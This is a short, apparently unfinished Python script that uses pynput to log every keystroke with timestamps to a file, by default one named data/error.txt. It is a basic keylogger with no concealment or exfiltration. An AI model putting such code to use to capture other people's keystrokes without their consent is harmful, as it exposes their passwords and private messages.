import os
from pynput.keyboard import Key, Listener
from pynput import keyboard
import logging
import time
import sys

def main():
	try:
		start(sys.argv[1])
	except:
		start('data/error.txt')
	# doesnt work (gets stuck on with)

def on_press(key):
	try:
		logging.info('{0} pressed'.format(
			key.char))
	except AttributeError:
		logging.info('special: {0} pressed'.format(
			key))

def on_release(key):
	try:
		logging.info('{0} released'.format(
			key.char))
	except:
		logging.info('special: {0} released'.format(
			key))


def start(path):
	logging.basicConfig(filename = path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
	print("working")
	with keyboard.Listener(
			on_press=on_press,
			on_release=on_release) as listener:
		listener.join()

# need to embed in listener
def stop():
	return False

if __name__ == '__main__':
	main()



